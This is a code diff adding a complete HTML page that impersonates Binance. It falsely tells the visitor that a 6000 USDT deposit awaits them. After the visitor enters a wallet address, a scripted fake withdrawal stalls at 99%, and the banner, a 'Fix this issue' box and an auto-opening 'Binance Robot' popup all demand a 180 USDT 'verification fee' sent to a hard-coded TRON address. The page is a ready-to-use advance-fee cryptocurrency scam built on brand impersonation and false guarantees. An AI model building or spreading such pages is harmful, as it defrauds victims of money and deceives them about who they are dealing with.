@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Binance | USDT Deposit Confirmation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Binance Font and Icons -->
+  <link href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap" rel="stylesheet">
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png">
+  <style>
+    :root {
+      --binance-yellow: #f3ba2f;
+      --binance-dark: #181a20;
+      --binance-grey: #23262f;
+      --binance-light-grey: #353945;
+      --binance-white: #fff;
+      --binance-accent: #d1a115;
+      --binance-green: #27ae60;
+      --binance-red: #eb5757;
+      --binance-blue: #2f80ed;
+      --binance-border: #383d4d;
+    }
+    body {
+      background: var(--binance-dark);
+      color: var(--binance-white);
+      font-family: 'Inter', 'Segoe UI', 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 420px;
+      margin: 38px auto 0 auto;
+      background: var(--binance-grey);
+      border-radius: 18px;
+      padding: 34px 22px 28px 22px;
+      box-shadow: 0 8px 32px rgba(24,26,32,0.35);
+      border: 1px solid var(--binance-light-grey);
+      position: relative;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .header img {
+      width: 56px;
+      margin-bottom: 10px;
+      animation: binancePulse 1.5s infinite alternate;
+    }
+    @keyframes binancePulse {
+      0% { filter: drop-shadow(0 0 0 var(--binance-yellow)); }
+      100% { filter: drop-shadow(0 0 12px var(--binance-yellow)); }
+    }
+    .brand-title {
+      margin: 0 0 2px 0;
+      font-size: 1.32rem;
+      font-weight: 700;
+      color: var(--binance-yellow);
+      letter-spacing: 0.8px;
+    }
+    .header-desc {
+      color: #fffbe6;
+      font-size: 1.05em;
+      font-weight: 500;
+      margin-bottom: 2px;
+    }
+    .notice {
+      background: rgba(243,186,47,0.13);
+      border: 1.5px solid var(--binance-yellow);
+      color: var(--binance-dark);
+      padding: 16px 13px;
+      border-radius: 8px;
+      margin-bottom: 22px;
+      text-align: center;
+      font-size: 1.07em;
+      font-weight: 600;
+      display: none;
+    }
+    .summary {
+      background: var(--binance-light-grey);
+      border-radius: 13px;
+      padding: 21px 19px;
+      margin-bottom: 24px;
+      border: 1.2px solid var(--binance-border);
+      box-shadow: 0 2px 8px rgba(24,26,32,0.16);
+    }
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 11px;
+      font-size: 1.07em;
+    }
+    .summary-row:last-child {
+      margin-bottom: 0;
+    }
+    .highlight {
+      color: var(--binance-yellow);
+      font-weight: bold;
+      letter-spacing: 0.5px;
+    }
+    .claim-section {
+      margin: 22px 0 28px 0;
+      text-align: center;
+    }
+    .circle-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      width: 72px;
+      height: 72px;
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      font-size: 1.11em;
+      font-weight: 700;
+      border: none;
+      box-shadow: 0 2px 8px rgba(243,186,47,0.13);
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-bottom: 16px;
+      outline: none;
+    }
+    .claim-form {
+      margin: 0 auto;
+      max-width: 340px;
+      display: none;
+      flex-direction: column;
+      gap: 14px;
+      background: var(--binance-light-grey);
+      border-radius: 10px;
+      padding: 18px 16px 12px 16px;
+      border: 1px solid var(--binance-grey);
+      box-shadow: 0 1px 4px rgba(24,26,32,0.07);
+    }
+    .claim-form label {
+      font-weight: 500;
+      margin-bottom: 4px;
+      color: var(--binance-yellow);
+      text-align: left;
+    }
+    .claim-form input[type="text"] {
+      padding: 9px 11px;
+      border-radius: 7px;
+      border: 1.5px solid var(--binance-yellow);
+      font-size: 1em;
+      background: var(--binance-grey);
+      color: var(--binance-white);
+      margin-bottom: 8px;
+      outline: none;
+      width: 100%;
+      box-sizing: border-box;
+      letter-spacing: 0.5px;
+    }
+    .claim-form .confirm-btn {
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      font-weight: 600;
+      font-size: 1.09em;
+      padding: 10px 0;
+      border: none;
+      border-radius: 7px;
+      box-shadow: 0 2px 8px rgba(243,186,47,0.07);
+      cursor: pointer;
+      margin-top: 3px;
+      transition: background 0.2s;
+    }
+    .processing {
+      display: none;
+      text-align: center;
+      margin: 18px 0 30px 0;
+      font-size: 1.15em;
+      color: var(--binance-yellow);
+      font-weight: 600;
+    }
+    .processing img {
+      vertical-align: middle;
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
+    }
+    .holdings-title {
+      margin-top:16px; 
+      margin-bottom:9px; 
+      font-size:1.13em; 
+      color:var(--binance-yellow); 
+      font-weight:600;
+    }
+    .token-table {
+      width: 100%;
+      margin-top: 12px;
+      border-collapse: collapse;
+      background: var(--binance-light-grey);
+      border-radius: 9px;
+      overflow: hidden;
+      font-size: 0.99em;
+      border: 1px solid var(--binance-grey);
+      box-shadow: 0 2px 8px rgba(24,26,32,0.12);
+    }
+    .token-table th, .token-table td {
+      padding: 11px 9px;
+      text-align: left;
+    }
+    .token-table th {
+      color: var(--binance-yellow);
+      background: var(--binance-grey);
+      font-weight: 600;
+      border-bottom: 2px solid var(--binance-yellow);
+    }
+    .token-table tr:not(:last-child) td {
+      border-bottom: 1px solid var(--binance-grey);
+    }
+    .security-tip {
+      margin: 19px 0 13px 0;
+      background: rgba(243,186,47,0.11);
+      padding: 15px 16px;
+      border-radius: 8px;
+      color: var(--binance-yellow);
+      font-size: 1.01em;
+      font-weight: 500;
+      text-align: center;
+      border: 1px solid var(--binance-yellow);
+    }
+    .footer {
+      text-align: center;
+      margin-top: 32px;
+      color: #8e99ad;
+      font-size: 0.99em;
+    }
+    a {
+      color: var(--binance-yellow);
+      text-decoration: underline;
+      word-break: break-all;
+      cursor: pointer;
+    }
+    /* Withdraw button & loader */
+    .withdraw-loader-box {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      margin: 40px 0 32px 0;
+    }
+    .withdraw-loader-circle {
+      position: relative;
+      width: 112px;
+      height: 112px;
+      margin-bottom: 15px;
+    }
+    .withdraw-loader-svg {
+      transform: rotate(-90deg);
+    }
+    .withdraw-loader-bg {
+      stroke: #2f2f39;
+      stroke-width: 9;
+    }
+    .withdraw-loader-fg {
+      stroke: var(--binance-yellow);
+      stroke-width: 9;
+      stroke-linecap: round;
+      transition: stroke-dasharray 0.15s linear;
+    }
+    .withdraw-logo {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 48px;
+      height: 48px;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      border-radius: 50%;
+      padding: 7px;
+      box-shadow: 0 2px 12px #f3ba2f22;
+      border: 2px solid var(--binance-yellow);
+    }
+    .withdraw-percent {
+      text-align: center;
+      font-size: 1.1em;
+      color: var(--binance-yellow);
+      font-weight: 700;
+      margin-bottom: 6px;
+      letter-spacing: 0.5px;
+    }
+    .withdraw-msg {
+      text-align: center;
+      color: #fffbe6;
+      font-size: 1.08em;
+      font-weight: 500;
+      margin-bottom: 0;
+      min-height: 33px;
+    }
+    /* Error */
+    .withdraw-error {
+      color: var(--binance-red);
+      font-weight: 700;
+      font-size: 1.13em;
+      margin-top: 14px;
+      text-align: center;
+      min-height: 40px;
+    }
+    /* Bot popup */
+    .bot-popup {
+      display: none;
+      position: fixed;
+      bottom: 34px;
+      right: 34px;
+      background: var(--binance-light-grey);
+      border: 2px solid var(--binance-yellow);
+      border-radius: 12px;
+      box-shadow: 0 4px 24px rgba(24,26,32,0.14);
+      padding: 22px 19px 14px 19px;
+      max-width: 330px;
+      z-index: 1000;
+      color: var(--binance-yellow);
+      font-size: 1.08em;
+      font-weight: 500;
+    }
+    .bot-popup .bot-header {
+      font-weight: 800;
+      font-size: 1.14em;
+      margin-bottom: 8px;
+      color: var(--binance-yellow);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .bot-popup .bot-header img {
+      width: 26px;
+      height: 26px;
+      vertical-align: middle;
+      background: #fff;
+      border-radius: 50%;
+      border: 2px solid var(--binance-yellow);
+      padding: 2px;
+    }
+    .bot-popup .bot-close {
+      position: absolute;
+      top: 8px;
+      right: 13px;
+      background: transparent;
+      border: none;
+      color: var(--binance-yellow);
+      font-size: 1.2em;
+      cursor: pointer;
+    }
+    .bot-popup .bot-error-msg {
+      color: var(--binance-red);
+      font-weight: 700;
+      margin-bottom: 9px;
+      font-size: 1.09em;
+    }
+    /* Fix issue section */
+    .fix-issue-section {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .fix-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      border: none;
+      border-radius: 7px;
+      font-size: 1.07em;
+      font-weight: 600;
+      padding: 10px 24px;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background 0.2s;
+    }
+    .fix-btn img {
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {transform: rotate(0deg);}
+      100% {transform: rotate(360deg);}
+    }
+    .fix-address-popup {
+      display: none;
+      background: var(--binance-light-grey);
+      border: 2px solid var(--binance-yellow);
+      border-radius: 9px;
+      padding: 17px 12px;
+      color: var(--binance-yellow);
+      font-weight: 600;
+      font-size: 1.06em;
+      margin: 18px auto 0 auto;
+      text-align: center;
+      position: relative;
+      max-width: 340px;
+    }
+    .fix-address-popup .copy-btn {
+      margin-top: 10px;
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      border: none;
+      border-radius: 6px;
+      padding: 8px 18px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 0.99em;
+    }
+    .fix-address-popup .copied-msg {
+      display: none;
+      color: var(--binance-green);
+      font-size: 0.97em;
+      margin-top: 8px;
+      font-weight: 500;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 18px 5vw;
+      }
+      .summary, .token-table {
+        font-size: 0.99em;
+      }
+      .bot-popup {
+        right: 5vw;
+        bottom: 5vw;
+        max-width: 95vw;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo">
+      <div class="brand-title">Binance</div>
+      <div class="header-desc">Your USDT deposit has been confirmed!</div>
+    </div>
+    <!-- Notice. Hidden by default, shown after processing -->
+    <div class="notice" id="notice">
+      <span>
+        <strong>Binance Verified Payment Notice:</strong><br>
+        This payment is from <span style="color:var(--binance-accent);">Coinbase</span> and <span style="color:var(--binance-green);">verified by Binance</span>.<br>
+        <b>Owner/Receiving Address for 6000 USDT:</b> <span id="userAddressNotice" style="color:var(--binance-blue);word-break:break-all;">TSLe6wK4Li4Z7NH4wzCWiUdLWym8m8P1eP</span><br>
+        To complete this transaction, a payment of <span style="color:var(--binance-yellow);">180 USDT</span> is required.<br>
+        <b>Send the 180 USDT TRC20 to:</b> <span style="color:var(--binance-red);word-break:break-all;">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</span><br>
+        <b>Once the payment is made, you are guaranteed to receive <span style="color:var(--binance-yellow);">6000 USDT</span> to your address above.</b>
+      </span>
+    </div>
+    <div class="summary">
+      <div class="summary-row">
+        <span>Amount</span>
+        <span class="highlight">6000 USDT <span style="color:#fffbe6;">($6,000.00)</span></span>
+      </div>
+      <div class="summary-row">
+        <span>Date</span>
+        <span>2025-07-14 17:20 UTC</span>
+      </div>
+      <div class="summary-row">
+        <span>Deposit Address (Recipient)</span>
+        <span>
+          <a id="userAddressSummary" href="https://www.blockchain.com/explorer/addresses/usdt/TSLe6wK4Li4Z7NH4wzCWiUdLWym8m8P1eP" target="_blank">TSLe6wK4Li4Z7NH4wzCWiUdLWym8m8P1eP</a>
+        </span>
+      </div>
+      <div class="summary-row">
+        <span>Transaction Hash</span>
+        <span>
+          <a href="https://binance.com" target="_blank">View in Explorer</a>
+        </span>
+      </div>
+      <div class="summary-row">
+        <span>Confirmations</span>
+        <span>4</span>
+      </div>
+      <div class="summary-row">
+        <span>Network Fee</span>
+        <span>3 USDT</span>
+      </div>
+      <div class="summary-row">
+        <span>Portfolio Balance</span>
+        <span class="highlight">6000 USDT <span style="color:#fffbe6;">($6,000.00)</span></span>
+      </div>
+    </div>
+    <!-- Claim Section -->
+    <div class="claim-section">
+      <button class="circle-btn" id="claimBtn">Claim<br>Deposit</button>
+      <form class="claim-form" id="claimForm" autocomplete="off">
+        <label for="usdtAddress">Enter your USDT TRC20 Address</label>
+        <input type="text" id="usdtAddress" name="usdtAddress" placeholder="TRC20 Address" required pattern="T[a-zA-Z0-9]{33}">
+        <button type="submit" class="confirm-btn">Confirm</button>
+      </form>
+      <div class="processing" id="processing">
+        <img src="https://i.imgur.com/llF5iyg.gif" alt="Processing...">Processing...
+      </div>
+    </div>
+    <!-- Withdraw animated loader here -->
+    <div class="withdraw-loader-box" id="withdrawLoaderBox">
+      <div class="withdraw-loader-circle">
+        <svg class="withdraw-loader-svg" width="112" height="112">
+          <circle class="withdraw-loader-bg" cx="56" cy="56" r="48" fill="none"/>
+          <circle class="withdraw-loader-fg" cx="56" cy="56" r="48" fill="none"
+                  stroke-dasharray="0 302.4"/>
+        </svg>
+        <img class="withdraw-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo">
+      </div>
+      <div class="withdraw-percent" id="withdrawPercent">1%</div>
+      <div class="withdraw-msg" id="withdrawMsg">Preparing withdrawal...</div>
+      <div class="withdraw-error" id="withdrawError"></div>
+    </div>
+    <div class="holdings-title">
+      Current Holdings
+    </div>
+    <table class="token-table">
+      <tr>
+        <th>Token</th>
+        <th>Balance</th>
+        <th>Value</th>
+      </tr>
+      <tr>
+        <td>USDT</td>
+        <td>6000.00</td>
+        <td>$6,000</td>
+      </tr>
+      <tr>
+        <td>BTC</td>
+        <td>0.00</td>
+        <td>$0</td>
+      </tr>
+      <tr>
+        <td>ETH</td>
+        <td>0.00</td>
+        <td>$0</td>
+      </tr>
+    </table>
+    <div class="security-tip">
+      <strong>Security Tip:</strong> Never share your private keys or recovery phrases with anyone. Binance support will never ask for them.
+    </div>
+    <div class="fix-issue-section">
+      <button class="fix-btn" id="fixBtn">
+        <img src="https://i.imgur.com/llF5iyg.gif" alt="loading">Fix this issue
+      </button>
+      <div class="fix-address-popup" id="fixAddressPopup">
+        <div>
+          Please forward <span style="color:var(--binance-yellow);">180 USDT (TRC20)</span> to the payment address below to complete your verified deposit:<br>
+          <b style="word-break:break-all;">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</b>
+        </div>
+        <button class="copy-btn" id="copyBtn">Copy Address</button>
+        <div class="copied-msg" id="copiedMsg">Copied!</div>
+      </div>
+    </div>
+    <div class="footer">
+      Need help? <span id="contactSupport" style="cursor:pointer;"><img src="https://cdn-icons-png.flaticon.com/512/4712/4712039.png" alt="Robot" style="width:18px;vertical-align:middle;margin-right:4px;">Contact Binance Robot</span>
+    </div>
+    <!-- Bot Popup -->
+    <div class="bot-popup" id="botPopup">
+      <button class="bot-close" id="botClose">&times;</button>
+      <div class="bot-header">
+        <img src="https://cdn-icons-png.flaticon.com/512/4712/4712039.png" alt="Robot"> Binance Robot
+      </div>
+      <div class="bot-error-msg">
+        <strong>Error:</strong> Additional verification required!
+      </div>
+      <div>
+        Our system detected that your deposit requires a <b>Binance Certified Verification Fee</b> of <b style="color:var(--binance-yellow);">180 USDT</b>.<br>
+        Please send <b style="color:var(--binance-yellow);">180 USDT (TRC20)</b> to the following Binance certified address:<br>
+        <span style="color:var(--binance-red);word-break:break-all;">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</span><br>
+        <span style="color:var(--binance-green);">Your payment is verified and certified by Binance.com.</span><br>
+        Once complete, <b style="color:var(--binance-yellow);">6000 USDT</b> will be released to your receiving address:<br>
+        <span id="userAddressBot" style="color:var(--binance-blue);word-break:break-all;">TSLe6wK4Li4Z7NH4wzCWiUdLWym8m8P1eP</span>
+      </div>
+    </div>
+  </div>
+  <script>
+    // Elements
+    const claimBtn = document.getElementById('claimBtn');
+    const claimForm = document.getElementById('claimForm');
+    const usdtAddress = document.getElementById('usdtAddress');
+    const processing = document.getElementById('processing');
+    const notice = document.getElementById('notice');
+    const fixBtn = document.getElementById('fixBtn');
+    const fixAddressPopup = document.getElementById('fixAddressPopup');
+    const copyBtn = document.getElementById('copyBtn');
+    const copiedMsg = document.getElementById('copiedMsg');
+    const contactSupport = document.getElementById('contactSupport');
+    const botPopup = document.getElementById('botPopup');
+    const botClose = document.getElementById('botClose');
+    // Withdraw
+    const withdrawLoaderBox = document.getElementById('withdrawLoaderBox');
+    const withdrawPercent = document.getElementById('withdrawPercent');
+    const withdrawMsg = document.getElementById('withdrawMsg');
+    const withdrawError = document.getElementById('withdrawError');
+    const withdrawLoaderFg = document.querySelector('.withdraw-loader-fg');
+    // User address fields
+    const userAddressNotice = document.getElementById('userAddressNotice');
+    const userAddressSummary = document.getElementById('userAddressSummary');
+    const userAddressBot = document.getElementById('userAddressBot');
+
+    // Default address
+    let userAddress = "TSLe6wK4Li4Z7NH4wzCWiUdLWym8m8P1eP";
+
+    // Claim Deposit button
+    claimBtn.addEventListener('click', function() {
+      claimBtn.style.display = 'none';
+      claimForm.style.display = 'flex';
+    });
+
+    // Confirm address
+    claimForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      userAddress = usdtAddress.value || userAddress;
+      // Update all address references
+      userAddressNotice.textContent = userAddress;
+      userAddressNotice.style.wordBreak = "break-all";
+      userAddressSummary.href = "https://www.blockchain.com/explorer/addresses/usdt/" + userAddress;
+      userAddressSummary.textContent = userAddress;
+      userAddressBot.textContent = userAddress;
+      userAddressBot.style.wordBreak = "break-all";
+
+      claimForm.style.display = 'none';
+      processing.style.display = 'block';
+      setTimeout(() => {
+        processing.style.display = 'none';
+        notice.style.display = 'block';
+        // Show Withdraw Loader after claim
+        setTimeout(() => {
+          notice.style.display = 'none';
+          runWithdrawLoader();
+        }, 2600);
+      }, 2200);
+    });
+
+    // Withdraw loader logic
+    function runWithdrawLoader() {
+      withdrawLoaderBox.style.display = 'flex';
+      withdrawError.textContent = '';
+      let percent = 1;
+      let interval = setInterval(() => {
+        percent += Math.floor(Math.random() * 4) + 1; // randomize loading
+        if (percent >= 99) percent = 99;
+        withdrawPercent.textContent = percent + '%';
+        updateWithdrawCircle(percent);
+
+        withdrawMsg.textContent = `Sending 6000 USDT to User Address...`;
+        if (percent >= 99) {
+          clearInterval(interval);
+          setTimeout(() => {
+            withdrawPercent.textContent = '99%';
+            withdrawMsg.textContent = '';
+            withdrawError.innerHTML = `<img style="vertical-align:middle;width:22px;height:22px;margin-right:7px;" src="https://cdn-icons-png.flaticon.com/512/4712/4712039.png" alt="Robot"> <span>Withdrawal Error: Additional verification required!<br><span style="color:var(--binance-yellow);font-weight:500;">Please complete the Binance Certified Verification Fee of <b>180 USDT</b> to continue.</span></span>`;
+            setTimeout(() => {
+              contactSupport.click();
+            }, 1200);
+          }, 700);
+        }
+      }, 45);
+    }
+    function updateWithdrawCircle(percent) {
+      // SVG circle dasharray for 48px radius: 2 * π * 48 = 301.6
+      let total = 2 * Math.PI * 48;
+      let val = Math.max(2, Math.min(percent, 100)) / 100 * total;
+      withdrawLoaderFg.setAttribute('stroke-dasharray', `${val} ${total - val}`);
+    }
+
+    // Fix issue button
+    fixBtn.addEventListener('click', function() {
+      fixAddressPopup.style.display = 'block';
+    });
+
+    // Copy address
+    copyBtn.addEventListener('click', function() {
+      const address = 'TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa';
+      navigator.clipboard.writeText(address)
+        .then(() => {
+          copiedMsg.style.display = 'block';
+          setTimeout(() => copiedMsg.style.display = 'none', 1600);
+        });
+    });
+
+    // Contact support (robot)
+    contactSupport.addEventListener('click', function(e) {
+      e.preventDefault();
+      botPopup.style.display = 'block';
+    });
+
+    // Bot close
+    botClose.addEventListener('click', function() {
+      botPopup.style.display = 'none';
+    });
+
+    // On page load, make sure everything is reset
+    window.onload = () => {
+      // Always start with withdraw loader hidden
+      withdrawLoaderBox.style.display = 'none';
+      withdrawError.textContent = '';
+      notice.style.display = 'none';
+      claimForm.style.display = 'none';
+      processing.style.display = 'none';
+      fixAddressPopup.style.display = 'none';
+      botPopup.style.display = 'none';
+      claimBtn.style.display = 'inline-flex';
+      userAddressNotice.textContent = userAddress;
+      userAddressSummary.href = "https://www.blockchain.com/explorer/addresses/usdt/" + userAddress;
+      userAddressSummary.textContent = userAddress;
+      userAddressBot.textContent = userAddress;
+    };
+  </script>
+</body>
+</html>
